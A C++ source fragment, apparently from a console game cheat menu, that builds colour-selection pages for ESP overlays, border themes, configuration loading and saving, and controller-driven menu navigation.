		addColormenu(hash("Aqua Green"), color(24, 119, 72, 255));
		addColormenu(hash("Sky Blue"), color(24, 189, 240, 255));
		addColormenu(hash("Cerulean"), color(65, 60, 219, 255));
		addColormenu(hash("Magenta"), color(254, 39, 57, 255));
		addColormenu(hash("Wisteria"), color(12, 186, 92, 255));
		addColormenu(hash("Lime Green"), color(53, 254, 75, 255));
		addColormenu(hash("Golden Yellow"), color(207, 179, 55, 255));
		addColormenu(hash("Red Orange"), color(204, 51, 27, 255));
		break;
	case ID_ESPTHEME:
		addTitle(hash("ESP Colors"), ID_THEME);
		addColorSubmenu(hash("Enemy Color"), ID_E, menu->en);
		addColorSubmenu(hash("Friendly Color"), ID_F, menu->fn);
		addColorSubmenu(hash("Hittable Color"), ID_H, menu->hitble);

		addColorSubmenu(hash("Tracer Color"), ID_T, menu->trcr);
		addColorSubmenu(hash("Shield Color"), ID_HB, menu->hb);
		addColorSubmenu(hash("Crosshair Color"), ID_XH, menu->xh);
		addColorSubmenu(hash("Fov Circle Color"), ID_FC, menu->fc);
		break;
	case ID_E:
		addTitle(hash("Enemy Color"), ID_ESPTHEME);
		addColormenu1(hash("Current Color"), menu->en);
		addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->en.r, 0.01f, true);
		addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->en.g, 0.01f, true);
		addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->en.b, 0.01f, true);
		addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->en.a, 0.01f, true);
		addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->en);
		addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->en);
		addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->en);
		addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->en);
		addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->en);
		addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->en);
		addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->en);
		addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->en);
		addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->en);
		addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->en);
		addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->en);
		addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->en);
		addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->en);
		addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->en);
		addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->en);
		addCheck2(hash("Enable Fade"), menu->en.Rainbow, hash("Enables color fade transitions"));
		if (menu->en.Rainbow)
			addBar(hash("Rain Fade"), 0.0f, 1.0f, menu->en.RainbowSpeed, 0.01f, hash("Color transition speed"));
		break;
	case ID_F:
		addTitle(hash("Friendly Color"), ID_ESPTHEME);
		addColormenu1(hash("Current Color"), menu->fn);
		addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->fn.r, 0.01f, true);
		addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->fn.g, 0.01f, true);
		addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->fn.b, 0.01f, true);
		addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->fn.a, 0.01f, true);
		addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->fn);
		addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->fn);
		addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->fn);
		addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->fn);
		addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->fn);
		addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->fn);
		addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->fn);
		addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->fn);
		addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->fn);
		addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->fn);
		addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->fn);
		addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->fn);
		addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->fn);
		addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->fn);
		addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->fn);
		addCheck2(hash("Enable Fade"), menu->fn.Rainbow, hash("Enables color fade transitions"));
		if (menu->fn.Rainbow)
			addBar(hash("Rain Fade"), 0.0f, 1.0f, menu->fn.RainbowSpeed, 0.01f, hash("Color transition speed"));
		break;
	case ID_H:
		addTitle(hash("Hitible Color"), ID_ESPTHEME);
		addColormenu1(hash("Current Color"), menu->hitble);
		addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->hitble.r, 0.01f, true);
		addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->hitble.g, 0.01f, true);
		addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->hitble.b, 0.01f, true);
		addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->hitble.a, 0.01f, true);
		addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->hitble);
		addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->hitble);
		addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->hitble);
		addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->hitble);
		addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->hitble);
		addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->hitble);
		addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->hitble);
		addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->hitble);
		addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->hitble);
		addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->hitble);
		addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->hitble);
		addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->hitble);
		addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->hitble);
		addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->hitble);
		addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->hitble);
		addCheck2(hash("Enable Fade"), menu->hitble.Rainbow, hash("Enables color fade transitions"));
		if (menu->hitble.Rainbow)
			addBar(hash("Rain Fade"), 0.0f, 1.0f, menu->hitble.RainbowSpeed, 0.01f, hash("Color transition speed"));
		break;
	case ID_T:
		addTitle(hash("Tracer Color"), ID_ESPTHEME);
		addColormenu1(hash("Current Color"), menu->trcr);
		addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->trcr.r, 0.01f, true);
		addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->trcr.g, 0.01f, true);
		addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->trcr.b, 0.01f, true);
		addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->trcr.a, 0.01f, true);
		addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->trcr);
		addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->trcr);
		addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->trcr);
		addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->trcr);
		addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->trcr);
		addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->trcr);
		addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->trcr);
		addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->trcr);
		addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->trcr);
		addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->trcr);
		addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->trcr);
		addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->trcr);
		addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->trcr);
		addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->trcr);
		addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->trcr);
		addCheck2(hash("Enable Fade"), menu->trcr.Rainbow, hash("Enables color fade transitions"));
		if (menu->trcr.Rainbow)
			addBar(hash("Rain Fade"), 0.0f, 1.0f, menu->trcr.RainbowSpeed, 0.01f, hash("Color transition speed"));
		break;
	case ID_HB:
		addTitle(hash("Shield Color"), ID_ESPTHEME);
		addColormenu1(hash("Current Color"), menu->hb);
		addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->hb.r, 0.01f, true);
		addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->hb.g, 0.01f, true);
		addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->hb.b, 0.01f, true);
		addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->hb.a, 0.01f, true);
		addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->hb);
		addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->hb);
		addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->hb);
		addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->hb);
		addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->hb);
		addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->hb);
		addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->hb);
		addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->hb);
		addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->hb);
		addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->hb);
		addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->hb);
		addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->hb);
		addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->hb);
		addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->hb);
		addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->hb);
		addCheck2(hash("Enable Fade"), menu->hb.Rainbow, hash("Enables color fade transitions"));
		if (menu->hb.Rainbow)
			addBar(hash("Rain Fade"), 0.0f, 1.0f, menu->hb.RainbowSpeed, 0.01f, hash("Color transition speed"));
		break;
	case ID_XH:
		addTitle(hash("Crosshair Color"), ID_ESPTHEME);
		addColormenu1(hash("Current Color"), menu->xh);
		addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->xh.r, 0.01f, true);
		addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->xh.g, 0.01f, true);
		addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->xh.b, 0.01f, true);
		addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->xh.a, 0.01f, true);
		addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->xh);
		addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->xh);
		addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->xh);
		addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->xh);
		addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->xh);
		addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->xh);
		addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->xh);
		addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->xh);
		addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->xh);
		addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->xh);
		addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->xh);
		addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->xh);
		addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->xh);
		addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->xh);
		addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->xh);
		addCheck2(hash("Enable Fade"), menu->xh.Rainbow, hash("Enables color fade transitions"));
		if (menu->xh.Rainbow)
			addBar(hash("Rain Fade"), 0.0f, 1.0f, menu->xh.RainbowSpeed, 0.01f, hash("Color transition speed"));
		break;
	case ID_FC:
		addTitle(hash("Fov Circle Color"), ID_ESPTHEME);
		addColormenu1(hash("Current Color"), menu->fc);
		addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->fc.r, 0.01f, true);
		addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->fc.g, 0.01f, true);
		addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->fc.b, 0.01f, true);
		addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->fc.a, 0.01f, true);
		addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->fc);
		addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->fc);
		addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->fc);
		addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->fc);
		addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->fc);
		addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->fc);
		addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->fc);
		addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->fc);
		addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->fc);
		addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->fc);
		addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->fc);
		addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->fc);
		addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->fc);
		addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->fc);
		addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->fc);
		addCheck2(hash("Enable Fade"), menu->fc.Rainbow, hash("Enables color fade transitions"));
		if (menu->fc.Rainbow)
			addBar(hash("Rain Fade"), 0.0f, 1.0f, menu->fc.RainbowSpeed, 0.01f, hash("Color transition speed"));
		break;
	case ID_PRIMERY:
		addTitle(hash("Border Colors"), ID_THEME);
		addColormenu1(hash("Primary Color"), menu->skin3);
		addColorBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->skin3.r, 0.01f, true);
		addColorBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->skin3.g, 0.01f, true);
		addColorBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->skin3.b, 0.01f, true);
		if (!menu->lockcolor) {
			addColormenu1(hash("Secondary Color"), menu->skin4);
			addColorBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->skin4.r, 0.01f, true);
			addColorBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->skin4.g, 0.01f, true);
			addColorBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->skin4.b, 0.01f, true);

			addColormenu1(hash("Tertiary Color"), menu->skin5);
			addColorBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->skin5.r, 0.01f, true);
			addColorBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->skin5.g, 0.01f, true);
			addColorBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->skin5.b, 0.01f, true);

			addColormenu1(hash("Quaternary Color"), menu->skin6);
			addColorBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->skin6.r, 0.01f, true);
			addColorBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->skin6.g, 0.01f, true);
			addColorBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->skin6.b, 0.01f, true);
		}
		break;
	case ID_HVH:
		addTitle(hash("Config Setting"), ID_MAIN);
		addCOption(hash("Create New Config"), Mshit.ch, CreateConfig);
		for (int i = 0; i < Ini.Inis.size(); i++) {
			AddConfigSubmenu(Ini.Inis.at(i).c_str(), ID_CONFIG);
		}
		break;
	case ID_CONFIG:
		addTitle(Ini.Name, ID_HVH);
		AddConfigOption(hash("Load Config"), Mshit.ch, iload);
		if (strcmp(hash("Kiwis 1v1 HvH Settings.ini"), Ini.Name)) {
			AddConfigOption(hash("Save Config"), Mshit.ch, isave);
			AddConfigOption(hash("Delete Config"), Mshit.ch, DelConfig);
		}
		break;
	case ID_PLACEMENT:
		addTitle(hash("Move Menu"), ID_THEME);
		addMOption(hash("Move Up"), MoveUp, hash("Hold L1 to increase the movement speed"));
		addMOption(hash("Move Down"), MoveDown, hash("Hold L1 to increase the movement speed"));
		addMOption(hash("Move Left"), MoveLeft, hash("Hold L1 to increase the movement speed"));
		addMOption(hash("Move Right"), MoveRight, hash("Hold L1 to increase the movement speed"));
		break;
	default:
		addTitle(hash("Does Not Exist"), ID_MAIN);
		addSubmenu(hash("Return Home"), ID_MAIN);
		break;
	}
	//Virtual::Call<int>(memset_t, &_pdPad, 0, sizeof(CellPadData));
}

bool onceonly = true;
void HandleMenu() {
	if (ready) {
		if (PadDown(PAD_R3) && PadDown(PAD_LEFT) && !Mshit.Mopened)
			Mshit.id = ID_MAIN, Mshit.Mopened = true, Wait(200);
	}
	if (Mshit.Mopened) {
		/*if (Mshit.id == ID_MAIN) {
			if (Ini.Inis.size() != 0) {
				Ini.Inis.clear();
			}
		}*/

		if (PadDown(PAD_R3) && PadDown(PAD_LEFT)) {
			SND_Play(hash("cac_screen_hpan"), 1, 1);
		}

		if (ready) {

			int id = Mshit.id;

			if (!menu->combos[Mshit.id][Mshit.scroll[Mshit.id]].opened && !menu->combo_active) {
				if (PadDown(PAD_UP)) {
					short position = Mshit.scroll[id] - 1;
					if (position < 0) {
						position = Mshit.maxscroll[id] - 1;
						Mshit.menu_offsets[id] = Mshit.maxscroll[id] - Mshit.max_options + 1;
						if (Mshit.menu_offsets[id] < 0)
							Mshit.menu_offsets[id] = 0;
					}
					if (Mshit.menu_offsets[id] > 0) {
						Mshit.menu_offsets[id]--;
					}

					Mshit.scroll[id] = position;
					Wait(bot.scspeed);
					SND_Play(hash("cac_grid_nav"), 1, 1);

					//Mshit.scroll[id] = (Mshit.scroll[id] <= 0) ? Mshit.maxscroll[id] - 1 : Mshit.scroll[id] - 1, Wait(bot.scspeed),
				}

				if (PadDown(PAD_DOWN)) {
					short position = Mshit.scroll[id] + 1;
					if (Mshit.maxscroll[id] > Mshit.max_options)
						if (position >= Mshit.max_options)
							Mshit.menu_offsets[id]++;
					if (position > Mshit.maxscroll[id] - 1) {
						position = 0;
						if (Mshit.maxscroll[id] > Mshit.max_options) {
							Mshit.menu_offsets[id] = 0;
						}
					}

					Mshit.scroll[id] = position;
					Wait(bot.scspeed);
					SND_Play(hash("cac_grid_nav"), 1, 1);
					//Mshit.scroll[id] = (Mshit.scroll[id] >= Mshit.maxscroll[id] - 1) ? 0 : Mshit.scroll[id] + 1, ,

				}
			}

			if (ready) {
				if (PadDown(PAD_CIRCLE, CELL_PAD_BTN_OFFSET_DIGITAL2) && !menu->combo_active) {
					if (Mshit.id > ID_MAIN) {
						Mshit.menu_offsets[Mshit.prev[Mshit.id]] = Mshit.scroll[Mshit.prev[Mshit.id]] >= Mshit.max_options ? Mshit.scroll[Mshit.prev[Mshit.id]] + 1 - Mshit.max_options : 0;
						//Mshit.scroll[Mshit.prev[Mshit.id]] = 

						Mshit.id = Mshit.prev[Mshit.id], Wait(200),
							SND_Play(hash("caC_main_exit_cac"), 1, 1);
					} else
						Mshit.Mopened = false, Mshit.id = ID_MAIN, Wait(200),
						SND_Play(hash("cac_cmn_backout"), 1, 1);
				}
			}
		}
	}
}
